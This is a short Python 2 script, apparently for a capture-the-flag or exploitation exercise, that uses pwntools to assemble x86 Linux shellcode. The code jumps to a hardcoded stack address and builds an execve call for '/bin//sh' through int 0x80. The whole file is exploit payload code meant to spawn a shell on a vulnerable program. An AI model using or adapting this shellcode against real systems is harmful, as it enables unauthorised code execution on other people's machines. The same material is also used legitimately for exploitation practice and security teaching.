#! /usr/bin/env python

from pwn import *

SHELL_ASM = """
mov eax, 0xffffd93e;
jmp eax;
xor ecx, ecx;
mul ecx;
push ecx;
push 0x%s;
push 0x%s;
push esp;
pop ebx;
mov al, 0xb;
int 0x80;
""" % ("//sh"[::-1].encode('hex'), "/bin"[::-1].encode('hex'))

PAYLOAD = asm(SHELL_ASM)

print PAYLOAD
